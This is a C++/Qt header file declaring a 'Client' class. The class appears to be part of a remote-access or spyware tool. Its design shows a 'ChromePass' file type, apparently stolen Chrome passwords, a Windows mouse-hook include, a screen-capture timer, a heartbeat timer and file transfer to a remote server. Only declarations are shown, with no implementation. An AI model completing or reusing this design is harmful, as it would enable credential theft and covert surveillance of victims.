#ifndef CLIENT_H
#define CLIENT_H

#include <QObject>
#include <QTimer>
#include <QThread>

#include "config.h"
#include "fileserver.h"
#include "fileclient.h"
#include "mousehookWinApi.h"

enum Files
{
    ChromePass = 1
};

class Client : public QObject
{
    Q_OBJECT
public:
    explicit Client(QObject *parent = 0, const QString& path = QDir::currentPath(), QString _ip = "127.0.0.1", quint16 _port = 12345);
    ~Client();

signals:

private slots:
    void getOnline();
    void getFile(const QString& path, const QString& ip);
    void getString(const QString& string, const QString& ip);

private:
    void update();
    void getNewConfig(const QString& path);

    QString ip;
    qint16 port;
    QString path;
    QTimer* onlineTimer;
    QTimer* screenTimer;
    Config* config;
    FileServer* fileServer;
    FileClient* fileClient;
};

#endif // CLIENT_H
